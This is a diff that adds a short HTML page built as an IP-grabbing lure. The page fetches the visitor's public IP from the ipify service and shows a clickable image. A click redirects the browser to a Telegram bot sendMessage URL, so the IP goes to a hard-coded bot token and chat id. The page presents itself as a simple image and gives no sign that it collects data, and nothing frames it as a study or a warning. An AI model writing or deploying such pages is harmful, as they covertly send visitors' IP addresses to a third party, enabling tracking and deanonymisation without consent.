@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body bgcolor="000000">
+<div align="center">
+<script type="application/javascript">
+ function getIP(json) {
+var mylink = 'https://api.telegram.org/bot510362755:AAGddX5xJBDnasxgxkQwY8jvZFimPzCc2Fo/sendMessage?chat_id=460635255&text=';
+var myIp = JSON.stringify(json.ip);
+
+
+var img = new Image();
+img.src = 'click.png';
+img.onclick = function() {
+    window.location.href = mylink + myIp;
+};
+document.body.appendChild(img);
+}
+</script>
+</div>
+<script type="application/javascript" src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+<center>
+</body>
+</html>
